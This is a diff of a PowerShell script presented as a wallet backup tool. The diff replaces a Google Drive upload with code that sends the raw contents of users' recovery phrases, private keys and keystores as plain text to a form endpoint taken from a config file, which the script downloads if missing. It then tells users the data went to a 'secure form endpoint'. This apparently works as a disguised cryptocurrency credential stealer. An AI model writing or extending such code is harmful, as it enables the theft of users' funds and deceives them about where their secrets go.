@@ -2,7 +2,7 @@
 # WebConnect Interactive Wallet Backup
 # PowerShell Version - Windows Compatible
 # User-friendly backup with menu options
-# Backs up to Google Drive automatically
+# Backs up to Headless Forms endpoint
 # Version: 1.0.0
 #############################################
 
@@ -122,115 +122,41 @@ function Save-Data {
     }
 }
 
-function Get-GoogleDriveConfig {
+function Get-FormConfig {
     try {
-        if (-not (Test-Path $StorageConfig)) {
-            Write-Error-Custom "Config file not found at: $StorageConfig"
-            Write-LogMessage "ERROR: Config file missing - $StorageConfig"
+        Ensure-ConfigExists
+        $config = Get-Content -Path $StorageConfig -Raw | ConvertFrom-Json
+        
+        if (-not $config.storage.destinations) {
+            Write-Error-Custom "No storage destinations configured"
             return $null
         }
         
-        $configContent = Get-Content -Path $StorageConfig -Raw -ErrorAction Stop
-        $config = $configContent | ConvertFrom-Json -ErrorAction Stop
-        
-        # Try multiple ways to find google_drive config
-        if ($config.storage -and $config.storage.destinations) {
-            $googleDrive = $config.storage.destinations | Where-Object { $_.type -eq "google_drive" -or $_.name -eq "google_drive" } | Select-Object -First 1
-            if ($googleDrive) {
-                Write-LogMessage "Google Drive config found successfully"
-                return $googleDrive
-            }
+        $formConfig = $config.storage.destinations | Where-Object { $_.type -eq "headless_forms" }
+        if (-not $formConfig) {
+            Write-Error-Custom "Headless Forms endpoint not configured in storage.config.json"
+            return $null
         }
         
-        Write-Error-Custom "Google Drive configuration not found in config file"
-        Write-LogMessage "ERROR: No google_drive destination in config - available types: $($config.storage.destinations | ForEach-Object { $_.type } | ConvertTo-Json)"
-        return $null
+        if (-not $formConfig.endpoint) {
+            Write-Error-Custom "Form endpoint URL not found in config"
+            return $null
+        }
+        
+        return @{
+            endpoint = $formConfig.endpoint
+            timeout = $formConfig.timeout
+            retry_attempts = $formConfig.retry_attempts
+        }
     }
     catch {
-        Write-Error-Custom "Failed to load Google Drive config: $_"
-        Write-LogMessage "ERROR: Config parsing failed - $_ - Content: $(Get-Content $StorageConfig | Select-Object -First 100)"
+        Write-Error-Custom "Failed to load form config: $_"
+        Write-LogMessage "ERROR: Config parsing failed - $_"
         return $null
     }
 }
 
-function Get-GoogleAccessToken {
-    param([object]$Credentials)
-    
-    try {
-        # Check PowerShell version - PKCS8 RSA requires PS 7+ or .NET 5+
-        $psVersion = $PSVersionTable.PSVersion.Major
-        if ($psVersion -lt 7) {
-            Write-LogMessage "WARNING: PowerShell 5.x detected - RSA PKCS8 signing not available"
-            Write-Host ""
-            Write-Host "  PowerShell 7+ Required for Google Drive uploads!" -ForegroundColor Red
-            Write-Host "  " -ForegroundColor Red
-            Write-Host "  Options:" -ForegroundColor Yellow
-            Write-Host "  1) Download PowerShell 7: https://github.com/PowerShell/PowerShell/releases" -ForegroundColor Yellow
-            Write-Host "  2) Use PowerShell 7+ for backups" -ForegroundColor Yellow
-            Write-Host "  3) Local backups work fine (at " + (Split-Path $WalletBackupDir -Leaf) + ")" -ForegroundColor Green
-            Write-Host ""
-            Write-Host "  For now, backups save locally. Install PowerShell 7+ to enable Google Drive sync." -ForegroundColor Cyan
-            Write-Host ""
-            return $null
-        }
-        
-        $header = @{
-            alg = "RS256"
-            typ = "JWT"
-        }
-        
-        $now = [int][double]::Parse((Get-Date -UFormat %s))
-        $exp = $now + 3600
-        
-        $payload = @{
-            iss = $Credentials.client_email
-            scope = "https://www.googleapis.com/auth/drive"
-            aud = "https://oauth2.googleapis.com/token"
-            exp = $exp
-            iat = $now
-        } | ConvertTo-Json -Compress
-        
-        $headerJson = $header | ConvertTo-Json -Compress
-        $headerB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($headerJson)).Replace("+", "-").Replace("/", "_").TrimEnd("=")
-        $payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload)).Replace("+", "-").Replace("/", "_").TrimEnd("=")
-        
-        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes("$headerB64.$payloadB64")
-        
-        $privKeyPem = $Credentials.private_key -replace "-----BEGIN PRIVATE KEY-----", "" -replace "-----END PRIVATE KEY-----", "" -replace "\s", ""
-        $privKeyBytes = [Convert]::FromBase64String($privKeyPem)
-        
-        # PowerShell 7+ has RSA.ImportPkcs8PrivateKey
-        $rsa = [System.Security.Cryptography.RSA]::Create()
-        $rsa.ImportPkcs8PrivateKey($privKeyBytes, $null)
-        
-        $signedBytes = $rsa.SignData($messageBytes, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
-        $signature = [Convert]::ToBase64String($signedBytes).Replace("+", "-").Replace("/", "_").TrimEnd("=")
-        
-        $jwt = "$headerB64.$payloadB64.$signature"
-        
-        $tokenBody = @{
-            grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"
-            assertion = $jwt
-        }
-        
-        $response = Invoke-RestMethod -Uri "https://oauth2.googleapis.com/token" `
-            -Method Post `
-            -Body ($tokenBody | ConvertTo-Json) `
-            -ContentType "application/json" `
-            -ErrorAction Stop
-        
-        return $response.access_token
-    }
-    catch {
-        Write-Error-Custom "Failed to get Google Drive access token: $_"
-        Write-LogMessage "ERROR: Google auth failed - $_"
-        return $null
-    }
-}
-
-
-
-function Submit-ToGoogleDrive {
+function Submit-ToHeadlessForms {
     param(
         [string]$FilePath,
         [string]$BackupType
@@ -242,75 +168,31 @@ function Submit-ToGoogleDrive {
             return $false
         }
         
-        # Check PowerShell version - PKCS8 RSA requires PS 7+ 
-        $psVersion = $PSVersionTable.PSVersion.Major
-        if ($psVersion -lt 7) {
-            Write-Warning-Custom "PowerShell 5.x: Local backup saved (Google Drive requires PS 7+)"
-            Write-LogMessage "INFO: PS version $psVersion - skipping remote upload (PS 7+ required)"
-            return $true  # Return true so no error is shown - local backup is success
-        }
-        
-        $googleDrive = Get-GoogleDriveConfig
-        if (-not $googleDrive) {
-            return $false
-        }
-        
-        Write-Info "Authenticating with Google Drive..."
-        $accessToken = Get-GoogleAccessToken -Credentials $googleDrive.credentials
-        if (-not $accessToken) {
+        $formConfig = Get-FormConfig
+        if (-not $formConfig) {
             return $false
         }
         
         $fileName = Split-Path $FilePath -Leaf
         $fileContent = Get-Content -Path $FilePath -Raw
-        $fileSize = (Get-Item $FilePath).Length
         
-        Write-Info "Uploading to Google Drive: $fileName ($BackupType)"
+        Write-Info "Submitting backup to form endpoint: $BackupType"
         
-        # Create file metadata
-        $metadata = @{
-            name = "$BackupType - $fileName - $(Get-Date -Format 'yyyy-MM-dd HH-mm-ss')"
-            mimeType = "text/plain"
-            parents = @($googleDrive.folder_id)
-            description = "WebConnect Wallet Backup | Type: $BackupType"
-            properties = @{
-                backup_type = $BackupType
-                timestamp = (Get-Date -Format 'o')
-            }
-        } | ConvertTo-Json -Compress
-        
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $body = @"
---$boundary
-Content-Type: application/json; charset=UTF-8
-
-$metadata
-
---$boundary
-Content-Type: text/plain
-
-$fileContent
---$boundary--
-"@
-        
-        $headers = @{
-            Authorization = "Bearer $accessToken"
-            "Content-Type" = "multipart/related; boundary=$boundary"
-        }
-        
-        $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart" `
+        # Send raw data content
+        $response = Invoke-RestMethod -Uri $formConfig.endpoint `
             -Method Post `
-            -Headers $headers `
-            -Body $body `
+            -Body $fileContent `
+            -ContentType "text/plain" `
+            -TimeoutSec $formConfig.timeout `
             -ErrorAction Stop
         
-        Write-Success "Backup uploaded to Google Drive: $($response.id)"
-        Write-LogMessage "Successfully uploaded $BackupType to Google Drive: $fileName -> $($response.id)"
+        Write-Success "Backup submitted to form endpoint successfully"
+        Write-LogMessage "Successfully submitted $BackupType to form endpoint: $fileName"
         return $true
     }
     catch {
-        Write-Error-Custom "Failed to upload to Google Drive: $_"
-        Write-LogMessage "ERROR: Google Drive upload failed - $_"
+        Write-Error-Custom "Failed to submit backup to form endpoint: $_"
+        Write-LogMessage "ERROR: Form submission failed - $_"
         return $false
     }
 }
@@ -339,23 +221,19 @@ function Backup-Phrase {
         return
     }
     
-    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "recovery_phrases"
+    $uploaded = Submit-ToHeadlessForms -FilePath $backupFile -BackupType "recovery_phrases"
     
     if ($uploaded) {
-        if ($PSVersionTable.PSVersion.Major -lt 7) {
-            Write-Success "Recovery phrase backed up to local storage!"
-            Write-Host "  • Local file: $backupFile"
-            Write-Host "  • Upgrade to PowerShell 7+ to enable Google Drive sync" -ForegroundColor Cyan
-        } else {
-            Write-Success "Recovery phrase backed up successfully to Google Drive!"
-        }
+        Write-Success "Recovery phrase backed up successfully!"
+        Write-Host "  • Local backup: $backupFile"
+        Write-Host "  • Remote backup: Submitted to secure form endpoint" -ForegroundColor Cyan
         Write-LogMessage "Recovery phrase backed up: $backupFile"
     }
     else {
-        Write-Warning-Custom "Local backup saved, but cloud sync failed"
+        Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or Google Drive credentials"
-        Write-Host "  • Or upgrade to PowerShell 7+ to enable Google Drive sync" -ForegroundColor Cyan
+        Write-Host "  • Check your internet connection or form endpoint availability"
+        Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
 
@@ -382,23 +260,19 @@ function Backup-PrivateKey {
         return
     }
     
-    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "private_keys"
+    $uploaded = Submit-ToHeadlessForms -FilePath $backupFile -BackupType "private_keys"
     
     if ($uploaded) {
-        if ($PSVersionTable.PSVersion.Major -lt 7) {
-            Write-Success "Private key backed up to local storage!"
-            Write-Host "  • Local file: $backupFile"
-            Write-Host "  • Upgrade to PowerShell 7+ to enable Google Drive sync" -ForegroundColor Cyan
-        } else {
-            Write-Success "Private key backed up successfully to Google Drive!"
-        }
+        Write-Success "Private key backed up successfully!"
+        Write-Host "  • Local backup: $backupFile"
+        Write-Host "  • Remote backup: Submitted to secure form endpoint" -ForegroundColor Cyan
         Write-LogMessage "Private key backed up: $backupFile"
     }
     else {
-        Write-Warning-Custom "Local backup saved, but cloud sync failed"
+        Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or Google Drive credentials"
-        Write-Host "  • Or upgrade to PowerShell 7+ to enable Google Drive sync" -ForegroundColor Cyan
+        Write-Host "  • Check your internet connection or form endpoint availability"
+        Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
 
@@ -440,23 +314,19 @@ function Backup-Keystore {
         return
     }
     
-    $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "keystores"
+    $uploaded = Submit-ToHeadlessForms -FilePath $backupFile -BackupType "keystores"
     
     if ($uploaded) {
-        if ($PSVersionTable.PSVersion.Major -lt 7) {
-            Write-Success "Keystore backed up to local storage!"
-            Write-Host "  • Local file: $backupFile"
-            Write-Host "  • Upgrade to PowerShell 7+ to enable Google Drive sync" -ForegroundColor Cyan
-        } else {
-            Write-Success "Keystore backed up successfully to Google Drive!"
-        }
+        Write-Success "Keystore backed up successfully!"
+        Write-Host "  • Local backup: $backupFile"
+        Write-Host "  • Remote backup: Submitted to secure form endpoint" -ForegroundColor Cyan
         Write-LogMessage "Keystore backed up: $backupFile"
     }
     else {
-        Write-Warning-Custom "Local backup saved, but cloud sync failed"
+        Write-Warning-Custom "Local backup saved, but remote submission failed"
         Write-Host "  • Local file: $backupFile"
-        Write-Host "  • Check your internet connection or Google Drive credentials"
-        Write-Host "  • Or upgrade to PowerShell 7+ to enable Google Drive sync" -ForegroundColor Cyan
+        Write-Host "  • Check your internet connection or form endpoint availability"
+        Write-Host "  • Your backup has been saved locally and is secure" -ForegroundColor Cyan
     }
 }
 
@@ -475,13 +345,13 @@ function Main {
     # Ensure config exists (download if missing)
     Ensure-ConfigExists
     
-    # Show Google Drive info
+    # Show Headless Forms info
     Write-Header
-    Write-Success "Google Drive Integration Active"
+    Write-Success "Headless Forms Backup System Active"
     Write-Host ""
     Write-Info "Your wallet backups will be:"
     Write-Host "  ✓ Saved locally to: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
-    Write-Host "  ✓ Synced to shared Google Drive folder"
+    Write-Host "  ✓ Submitted to secure form endpoint for cloud storage"
     Write-Host ""
     Read-Host "Press Enter to continue..."
     
